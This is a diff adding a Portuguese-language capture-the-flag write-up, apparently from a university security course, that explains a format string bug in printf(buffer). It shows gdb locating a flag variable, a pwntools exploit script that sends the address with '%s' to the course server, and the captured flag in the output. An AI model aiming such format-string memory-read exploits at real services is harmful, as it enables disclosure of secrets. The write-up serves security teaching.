@@ -223,4 +223,56 @@ server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
 
 É possível confimar o valor da variável `target` - "The target variable's value (after):  0x00005000".
 
-# CTF
+# CTF - Semana 7
+
+## Desafio 1
+
+Depois de analisar o código-fonte, verificou-se que a vulnerabilidade (`format string vulnerability`) encontra-se na **linha 27** - `printf(buffer)`, onde o conteúdo do `buffer` (32 bytes) é dado pelo utilizador na linha 25 - `scanf("%32s", &buffer)`. Explorando esta vulnerabilidade é possível ler variáveis da memória, neste caso a variável onde se encontra a `flag`, e imprimi-las no `stdout`. Para isso, utilizou-se a mesma técnica da `task 2` do lab. Neste caso, foi necessário 1 `format specifier %x` para `0xaaaaaaaa` ser impresso e o endereço de memória da variável global `flag`, `0x804c060`, foi descoberto utilizando o _gdb_ tal como é sugerido.
+```gdb
+gdb-peda$ p &flag 
+$1 = (char (*)[40]) 0x804c060 <flag>
+```
+O payload é constituído pelo endereço de memória da variável onde se encontra a flag, `0x804c060`, e um format specifier `%s`, assim a função `printf` trata o valor desse endereço como uma string. O script fornecido foi alterado para o seguinte:
+
+- exploit_example.py
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
+p.recvuntil(b"got:")
+
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 32
+content = bytearray(0x0 for i in range(N))
+
+number  = 0x804c060
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%s"
+
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+p.sendline(content)
+p.interactive()
+```
+Com o endereço da flag e com a vulnerabilidade encontrada, é possível ler a flag da memória e imprimi-la no stdout:
+```bash
+[11/18/22]seed@VM:~/.../Semana7-Desafio1$ python3 exploit_example.py 
+[+] Opening connection to ctf-fsi.fe.up.pt on port 4004: Done
+[*] Switching to interactive mode
+You gave me this: `\xcflag{c861bc5ded72328543e4a577b4fb89c6}
+
+Disqualified!
+[*] Got EOF while reading in interactive
+```
